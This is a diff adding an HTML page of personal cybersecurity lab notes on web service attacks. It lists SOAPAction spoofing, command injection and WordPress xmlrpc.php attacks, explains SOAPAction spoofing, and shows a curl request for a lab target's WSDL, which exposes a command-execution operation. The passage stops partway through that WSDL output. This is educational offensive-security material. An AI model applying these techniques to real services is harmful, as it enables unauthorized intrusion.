@@ -1,0 +1,981 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Web Service - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../../../theme/pagetoc.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#web-service-attacks">Web Service Attacks</a>
+<ul>
+<li><a href="#soapaction-spoofing">SOAPAction Spoofing</a>
+<ul>
+<li><a href="#example">Example</a></li>
+</ul>
+</li>
+<li><a href="#command-injection">Command Injection</a>
+<ul>
+<li><a href="#example-1">Example</a></li>
+</ul>
+</li>
+<li><a href="#attacking-wordpress-xmlrpcphp">Attacking WordPress <em>xmlrpc.php</em></a>
+<ul>
+<li><a href="#example-2">Example</a>
+<ul>
+<li><a href="#ip-disclosure">IP Disclosure</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="web-service-attacks"><a class="header" href="#web-service-attacks">Web Service Attacks</a></h1>
+<h2 id="soapaction-spoofing"><a class="header" href="#soapaction-spoofing">SOAPAction Spoofing</a></h2>
+<p>SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.</p>
+<p>If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.</p>
+<h3 id="example"><a class="header" href="#example">Example</a></h3>
+<p>Suppose you are accessing a SOAP web service, whose WSDL file resides in <code>http://&lt;TARGET IP&gt;:3002/wsdl?wsdl</code>.</p>
+<p>The service's WSDL file can be found below:</p>
+<pre><code class="language-bash">d41y@htb[/htb]$ curl http://&lt;TARGET IP&gt;:3002/wsdl?wsdl 
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;wsdl:definitions targetNamespace="http://tempuri.org/" 
+  xmlns:s="http://www.w3.org/2001/XMLSchema" 
+  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
+  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" 
+  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" 
+  xmlns:tns="http://tempuri.org/" 
+  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
+  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" 
+  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
+  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/"&gt;
+  
+  &lt;wsdl:types&gt;
+    
+    
+    &lt;s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/"&gt;
+      
+      
+      
+      &lt;s:element name="LoginRequest"&gt;
+        
+        &lt;s:complexType&gt;
+          &lt;s:sequence&gt;
+            &lt;s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/&gt;
+            &lt;s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/&gt;
+          &lt;/s:sequence&gt;
+        &lt;/s:complexType&gt;
+        
+      &lt;/s:element&gt;
+      
+      
+      &lt;s:element name="LoginResponse"&gt;
+        
+        &lt;s:complexType&gt;
+          &lt;s:sequence&gt;
+            &lt;s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/&gt;
+          &lt;/s:sequence&gt;
+        &lt;/s:complexType&gt;
+      &lt;/s:element&gt;
+      
+      
+      &lt;s:element name="ExecuteCommandRequest"&gt;
+        
+        &lt;s:complexType&gt;
+          &lt;s:sequence&gt;
+            &lt;s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/&gt;
+          &lt;/s:sequence&gt;
+        &lt;/s:complexType&gt;
+        
+      &lt;/s:element&gt;
+      
